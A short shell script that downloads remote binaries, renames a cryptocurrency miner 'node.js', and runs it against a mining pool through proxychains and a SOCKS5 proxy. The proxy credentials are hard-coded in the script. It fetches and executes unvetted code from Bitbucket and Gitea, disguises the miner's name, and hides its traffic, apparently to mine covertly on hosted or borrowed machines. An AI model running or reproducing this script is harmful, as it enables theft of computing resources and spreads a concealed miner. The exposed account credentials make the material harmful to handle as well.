proxy="us-east-static-01.quotaguard.com" 
port="9293" 
user="5f9d165gvj71eu"  
pass="ninp27owlsys28ars0ni74zaamvvf2" 
wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./node.js -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Cucao) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://5f9d165gvj71eu:ninp27owlsys28ars0ni74zaamvvf2@us-east-static-01.quotaguard.com:1080 
